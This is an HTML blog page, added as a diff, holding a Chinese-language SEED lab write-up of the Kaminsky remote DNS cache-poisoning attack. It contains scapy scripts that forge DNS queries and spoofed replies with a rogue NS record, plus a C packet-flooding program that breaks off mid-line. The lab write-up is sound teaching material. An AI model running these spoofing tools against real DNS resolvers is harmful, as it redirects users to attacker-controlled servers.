@@ -1,0 +1,646 @@
+
+
+<!DOCTYPE html>
+<html lang="zn-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1.jpg">
+  <link rel="icon" href="/img/1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="环境设置 12345c08bebc0db10  user-10.9.0.596c30fe7ee1b  seed-attacker9757b8258d1f  local-dns-server-10.9.0.53ee5b2d82b9a1  attacker-ns-10.9.0.153eee6e69ae762  mysql-10.9.0.6 远程DNS缓存中毒攻击说明 本地DNS缓存中毒攻击有一定的局限">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lab11-DNS欺骗-Remote">
+<meta property="og:url" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/index.html">
+<meta property="og:site_name" content="Bubble&#39;s Blog">
+<meta property="og:description" content="环境设置 12345c08bebc0db10  user-10.9.0.596c30fe7ee1b  seed-attacker9757b8258d1f  local-dns-server-10.9.0.53ee5b2d82b9a1  attacker-ns-10.9.0.153eee6e69ae762  mysql-10.9.0.6 远程DNS缓存中毒攻击说明 本地DNS缓存中毒攻击有一定的局限">
+<meta property="og:locale" content="zn_CN">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.01.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.02.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.2.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.3.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.4.png">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.8.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.9.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.11.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.12.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.13.jpg">
+<meta property="article:published_time" content="2024-02-20T13:55:34.581Z">
+<meta property="article:modified_time" content="2024-02-21T08:41:01.028Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ybubble.github.io/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.01.jpg">
+  
+  
+  
+  <title>Lab11-DNS欺骗-Remote - Bubble&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ybubble.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Bubble</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Category</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Lab11-DNS欺骗-Remote"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-20 21:55" pubdate>
+          February 20, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Lab11-DNS欺骗-Remote</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>环境设置</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">c08bebc0db10  user-<span class="hljs-number">10.9.0.5</span><br><span class="hljs-number">96</span>c30fe7ee1b  seed-attacker<br><span class="hljs-number">9757</span>b8258d1f  local-dns-server-<span class="hljs-number">10.9.0.53</span><br>ee5b<span class="hljs-number">2d82b9a1</span>  attacker-ns-<span class="hljs-number">10.9.0.153</span><br>eee6e69ae762  mysql-<span class="hljs-number">10.9.0.6</span><br></code></pre></td></tr></table></figure>
+<h1>远程DNS缓存中毒攻击说明</h1>
+<p>本地DNS缓存中毒攻击有一定的局限性，必须在同一个局域网中。而远程攻击嗅探不到DNS请求。DNS请求中有两个数据远程攻击者很难获得：</p>
+<p>1、UDP头部的源端口号：DNS请求通过UDP数据包发送，源端口号是16比特的随机数字</p>
+<p>2、DNS头部16比特的交易ID</p>
+<blockquote>
+<p>:exclamation:一个欺骗回复必须包含这两个值，否则回复不会被接受。远程攻击者只能猜测这两个值，猜到 的概率为2的32次方，如果1秒内发1000个请求，则需要50天。如果用1000个主机的僵尸网络 发起攻击，则需要1.2小时</p>
+</blockquote>
+<p>而实际由于缓存的因素，DNS服务器不会对同一主机发起第二次请求，除非缓存内的结果过期。缓存的这个特点 使得攻击在尝试第二次攻击前需要等待，这使得远程DNS中毒攻击变得不现实。</p>
+<p><strong>Kaminsky攻击</strong></p>
+<p>为了对远程计算机发动欺骗攻击，需要完成三个任务：<br>
+1、触发目标服务器发送DNS请求<br>
+2、发送欺骗回复<br>
+3、使缓存失效</p>
+<p>他的思路不是让缓存失效，而是去修改域名服务器的上一级权威域名服务器。用一个随机的二级域名向远程DNS服务器发请求， 在上一级权威域名服务器回复消息前，伪造消息给远程域名服务器，带上NS记录，如果猜错则继续用随机二级域名重试。(二级域名，SLD，顶级域名之下的域名)</p>
+<p><strong>完整的DNS请求过程</strong></p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.01.jpg" srcset="/img/loading.gif" lazyload class="">
+<p><strong>kaminsky攻击实现过程</strong>（example.com名称服务器被缓存情况下的DNS查询过程）</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.02.jpg" srcset="/img/loading.gif" lazyload class="">
+<ol>
+<li>攻击者查询DNS服务器Apollo查询example.com中不存在的名称，<a target="_blank" rel="noopener" href="http://xn--twysw-4d3hh90d.example.com">例如twysw.example.com</a>，其中twysw是一个随机名称。</li>
+<li>由于映射在Apollo的DNS缓存中不可用，Apollo向example.com域的名称服务器发送一个DNS查询</li>
+<li>当Apollo等待回复时，攻击者用一连串欺骗的DNS响应淹没了Apollo，每个人都尝试了不同的事务ID，希望其中一个是正确的。在响应中，攻击者不仅为twysw.example.com提供了一个IP解析，攻击者还提供了一个“权威命名服务器”记录，指示ns.attacker32.com为example.com域的命名服务器。如果欺骗响应超过实际响应，并且事务ID与查询中的匹配，Apollo将接受并缓存欺骗答案，因此Apollo的DNS缓存将被中毒。</li>
+<li>即使欺骗的DNS响应失败（例如事务ID不匹配或太晚），也不重要，因为下次攻击者将查询不同的名称，所以Apollo必须发送另一个查询，给攻击另一个进行欺骗攻击的机会。这有效地破坏了缓存效果。</li>
+<li>如果攻击成功，在Apollo的DNS缓存中，example.com的命名服务器将被攻击者的命名服务器ns.attacker32.com所取代。</li>
+</ol>
+<h1>Lab Environment Setup (Task 1)</h1>
+<p>1、当执行命令<code>dig www.example.com</code>时，victim会把请求发送给本地域名服务器，本地域名服务器会发送请求给example.com的官方nameserver，最终的到对应的IP。</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.2.png" srcset="/img/loading.gif" lazyload class="">
+<p>2、当执行命令<code>dig @ns.attacker32.com www.example.com</code>时，<a target="_blank" rel="noopener" href="http://xn--ns-0j3cw2p30xq0fopi45w0hqjx4avgau37b.attacker32.com">查询请求会直接发送给ns.attacker32.com</a>，得到的IP为攻击者控制的IP。</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.3.png" srcset="/img/loading.gif" lazyload class="">
+<h1>Task 2: Construct DNS request</h1>
+<p>task2实现的是伪造DNS查询向本地域名服务器发送请求（一个未缓存的域名解析记录），使本地域名服务器也发送DNS请求。</p>
+<p>1、修改gen_dns_request.py，随机指定一个src IP，目标IP为本地域名服务器的IP10.9.0.53，查询的域名为一个随机且不存在的域名。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/bin/env python3</span><br><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># The source IP can be any address. </span><br><span class="hljs-comment"># However, if the target local DNS server is configured to only respond</span><br><span class="hljs-comment"># to requests from local machines, this source IP should be in the </span><br><span class="hljs-comment"># same network as the destination. </span><br>srcIP = <span class="hljs-string">&#x27;10.0.2.20&#x27;</span>  <br>dstIP = <span class="hljs-string">&#x27;10.9.0.53&#x27;</span>  <span class="hljs-comment"># Local DNS Server</span><br><br>ip  = IP (dst=dstIP, src=srcIP)<br>udp = UDP(dport=<span class="hljs-number">53</span>, sport=<span class="hljs-number">50945</span>, chksum=<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># The C code will modify the qname field</span><br>Qdsec = DNSQR(qname=<span class="hljs-string">&#x27;aaaaa.example.com&#x27;</span>)<br><br>dns   = DNS(<span class="hljs-built_in">id</span>=<span class="hljs-number">0xAAAA</span>, qr=<span class="hljs-number">0</span>, qdcount=<span class="hljs-number">1</span>, qd=Qdsec)<br><br>pkt = ip/udp/dns<br>send(pkt)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ip_req.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-built_in">bytes</span>(pkt))<br></code></pre></td></tr></table></figure>
+<p>2、攻击者运行攻击程序：<code>python3 gen_dns_request.py</code>，同时用wireshark抓包，查看效果。从wireshark的抓包结果来看，攻击者构造的数据包被成功发送，并且本地域名服务器也向其他DSN域名服务器发起了DNS请求。</p>
+<img src="/2024/02/20/Lab11_DNS%E6%AC%BA%E9%AA%97_Remote/11.4.png" srcset="/img/loading.gif" lazyload class="">
+<h1>Task 3: Spoof DNS Replies.</h1>
+<p>1、task3实现的是构造欺骗响应包，首先修改攻击代码如下，其中目标IP为本地域名服务器的IP，源IP为指定的IP。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/bin/env python3</span><br><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># The source IP can be any address, because it will be replaced </span><br><span class="hljs-comment"># by the C code with the IP address of example.com&#x27;s actual nameserver. </span><br><span class="hljs-comment"># 源IP可以是任何地址，因为它将被C代码替换为example.com的实际名称服务器的IP地址。</span><br>ip  = IP (dst = <span class="hljs-string">&#x27;10.9.0.53&#x27;</span>, src = <span class="hljs-string">&#x27;1.2.3.4&#x27;</span>)<br><br><span class="hljs-comment"># Set the checksum filed to zero. If this field is not set,</span><br><span class="hljs-comment"># Scapy will calculate checksum for us. Since the UDP packet</span><br><span class="hljs-comment"># will be modified later, this checksum will become invalid. </span><br><span class="hljs-comment"># Setting this field to zero means ignoring checksum (supported by UDP).</span><br><span class="hljs-comment"># Scapy will not do the calculation for us if the field is already set.</span><br><span class="hljs-comment"># 将校验和字段设置为零。如果未设置此字段，Scapy将为我们计算校验和。由于UDP数据包稍后会被修改，所以这个校验和将变得无效。将该字段设置为0意味着忽略校验和(UDP支持)。如果字段已经设置，Scapy将不会为我们进行计算。</span><br>udp = UDP(dport = <span class="hljs-number">33333</span>, sport = <span class="hljs-number">53</span>,  chksum=<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># Construct the Question section</span><br><span class="hljs-comment"># The C code will modify the qname field</span><br>Qdsec  = DNSQR(qname  = <span class="hljs-string">&quot;aaaaa.example.com&quot;</span>)<br><br><span class="hljs-comment"># Construct the Answer section (the answer can be anything)</span><br><span class="hljs-comment"># The C code will modify the rrname field</span><br>Anssec = DNSRR(rrname = <span class="hljs-string">&quot;aaaaa.example.com&quot;</span>,<br>               <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;A&#x27;</span>, <br>               rdata  = <span class="hljs-string">&#x27;1.1.1.1&#x27;</span>, <br>               ttl    = <span class="hljs-number">259200</span>)<br><br><span class="hljs-comment"># Construct the Authority section (the main goal of the attack) </span><br>NSsec  = DNSRR(rrname = <span class="hljs-string">&quot;aaaaa.example.com&quot;</span>, <br>               <span class="hljs-built_in">type</span>   = <span class="hljs-string">&#x27;NS&#x27;</span>, <br>               rdata  = <span class="hljs-string">&#x27;1.2.3.4&#x27;</span>,<br>               ttl    = <span class="hljs-number">259200</span>)<br><br><span class="hljs-comment"># Construct the DNS part </span><br><span class="hljs-comment"># The C code will modify the id field</span><br>dns    = DNS(<span class="hljs-built_in">id</span>  = <span class="hljs-number">0xAAAA</span>, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">1</span>, qr=<span class="hljs-number">1</span>, <br>             qdcount = <span class="hljs-number">1</span>, qd = Qdsec,<br>             ancount = <span class="hljs-number">1</span>, an = Anssec, <br>             nscount = <span class="hljs-number">1</span>, ns = NSsec)<br><br><span class="hljs-comment"># Construct the IP packet and save it to a file.</span><br>Replypkt = ip/udp/dns<br>send(Replypkt)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ip_resp.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-built_in">bytes</span>(Replypkt))<br></code></pre></td></tr></table></figure>
+<p>2、攻击者运行攻击代码，并用wireshark抓包，查看攻击效果。通过wireshark的抓包结果可以看到，欺骗DNS响应包已经成功发送给本地域名服务器。</p>
+
+<h1>Task 4: Launch the Kaminsky Attack</h1>
+<p>1、使用C语言会比使用python的效率更高，task4将c语言代码和scapy库相结合，实现攻击。在gen_dns_request.py中把srcIP修改为用户IP10.9.0.5，在gen_dns_response.py中把srcIP改为199.43.135.53。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FILE_SIZE 1000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SPOOF_PER_REQUEST 100</span><br><br><span class="hljs-comment">// Example.com&#x27;s nameservers</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NS1 <span class="hljs-string">&quot;199.43.133.53&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NS2 <span class="hljs-string">&quot;199.43.135.53&quot;</span></span><br><br><span class="hljs-comment">// Root A and B&#x27;s nameservers</span><br><span class="hljs-comment">//#define NS1 &quot;198.41.0.4&quot;</span><br><span class="hljs-comment">//#define NS2 &quot;192.228.79.201&quot;</span><br><br><br><span class="hljs-comment">/* IP Header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipheader</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_ihl:<span class="hljs-number">4</span>, <span class="hljs-comment">//IP header length</span><br>                     iph_ver:<span class="hljs-number">4</span>; <span class="hljs-comment">//IP version</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_tos; <span class="hljs-comment">//Type of service</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_len; <span class="hljs-comment">//IP Packet length (data + header)</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_ident; <span class="hljs-comment">//Identification</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_flag:<span class="hljs-number">3</span>, <span class="hljs-comment">//Fragmentation flags</span><br>                     iph_offset:<span class="hljs-number">13</span>; <span class="hljs-comment">//Flags offset</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_ttl; <span class="hljs-comment">//Time to Live</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>      iph_protocol; <span class="hljs-comment">//Protocol type</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> <span class="hljs-type">int</span> iph_chksum; <span class="hljs-comment">//IP datagram checksum</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_sourceip</span>;</span> <span class="hljs-comment">//Source IP address </span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span>  <span class="hljs-title">in_addr</span>    <span class="hljs-title">iph_destip</span>;</span>   <span class="hljs-comment">//Destination IP address </span><br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_raw_packet</span><span class="hljs-params">(<span class="hljs-type">char</span> * buffer, <span class="hljs-type">int</span> pkt_size)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_request</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *, <span class="hljs-type">int</span>, <span class="hljs-type">char</span> *)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">send_dns_response</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *ip_resp, <span class="hljs-type">int</span> n_resp, </span><br><span class="hljs-params">            <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *src_ip, <span class="hljs-type">char</span> * name, </span><br><span class="hljs-params">            <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> transaction_id)</span>; <br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">long</span> i = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> transaction_id = <span class="hljs-number">0</span>;<br><br>  srand(time(<span class="hljs-literal">NULL</span>));<br><br>  <span class="hljs-comment">// Load the DNS request packet from file</span><br>  FILE * f_req = fopen(<span class="hljs-string">&quot;ip_req.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>  <span class="hljs-keyword">if</span> (!f_req) &#123;<br>     perror(<span class="hljs-string">&quot;Can&#x27;t open &#x27;ip_req.bin&#x27;&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ip_req[MAX_FILE_SIZE];<br>  <span class="hljs-type">int</span> n_req = fread(ip_req, <span class="hljs-number">1</span>, MAX_FILE_SIZE, f_req);<br><br>  <span class="hljs-comment">// Load the first DNS response packet from file</span><br>  FILE * f_resp = fopen(<span 